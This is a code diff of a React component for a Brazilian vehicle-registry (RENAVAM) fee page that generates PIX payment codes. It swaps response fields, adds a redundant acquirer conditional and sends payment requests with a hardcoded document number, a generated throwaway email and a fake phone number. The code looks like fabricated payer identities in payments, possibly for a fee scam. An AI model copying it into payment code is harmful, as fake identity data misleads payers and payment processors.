@@ -104,8 +104,8 @@ const ResultadoRenavam = () => {
       const response = await enviarDadosParaAPI(valorTotal);
 
       // Atualiza o estado `codPix` com o valor retornado da API
-      const codigoPix = response?.invoice?.fatura?.pix?.payload;
-      const invoice = response?.invoice?.fatura?.id;
+      const codigoPix = response?.pix;
+      const invoice = response?.id;
 
       if (codigoPix) {
         setCodPix(codigoPix);
@@ -242,12 +242,19 @@ const ResultadoRenavam = () => {
       // Formata o valor total
       const valorTotalFormatado = formatarValorTotal(valorTotal);
 
+      let acquirer = "carthero";
+
+      if (valorTotalFormatado > 2999.0) {
+        acquirer = "carthero";
+      }
+
       // Dados mockados para envio
       const payload = {
+        acquirer,
         idGuest: idDtrVisitante,
         costumerData: {
           name: data.proprietario.nome,
-          document: "18715615000160",
+          document: "69807707722",
           email: `taxas-${Date.now()}@gmail.com`,
           phone: `${Math.floor(Date.now() / 100)}`,
           address: {
